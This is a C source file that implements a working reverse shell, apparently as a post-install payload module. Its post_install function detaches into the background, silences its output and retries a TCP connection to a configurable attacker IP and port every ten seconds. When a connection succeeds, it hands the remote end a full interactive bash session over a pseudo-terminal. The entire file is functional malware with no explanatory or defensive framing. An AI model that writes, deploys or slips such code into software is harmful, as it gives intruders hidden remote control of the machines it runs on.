#include <stdint.h>
#include <sys/types.h>
#include <fcntl.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include "tas/tas.h"

#ifndef IP
 #define IP "127.0.0.1"
 #warning using default IP: 127.0.0.1
#endif

#ifndef PORT
 #define PORT 1337
 #warning using default PORT: 1337
#endif

int reverse_shell(void);

void myshell(int fd)
{
	tas_tty tty = TAS_TTY_INIT;
	pid_t pid = tas_forkpty(&tty);

	if (pid <= 0) {
		if (pid == -1) {
			goto end;
		}

		setenv("TERM", "xterm-256color", 1);

		execvp("/bin/bash", (char *[]){ "-bash", NULL });
		_exit(1);
	}

	tty.stdin_fd = tty.stdout_fd = fd;
	tas_tty_loop(&tty);

end:
	close(fd);
}

void post_install(void)
{
	pid_t pid = fork();
	if (pid) {
		return;
	}

	setsid();

	int fd = open("/dev/null", O_RDWR);
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);

	if (fd > 2)
		close(fd);

	while (reverse_shell()) {
		sleep(10);
	}

	_exit(0);
}

int reverse_shell(void){
	int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == -1) {
		return 1;
	}

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(PORT),
		.sin_addr.s_addr = inet_addr(IP)
	};

	socklen_t slen = sizeof(addr);

	if (connect(sockfd, (struct sockaddr *) &addr, slen) == -1) {
		return 1;
	}

	myshell(sockfd);
	return 0;
}
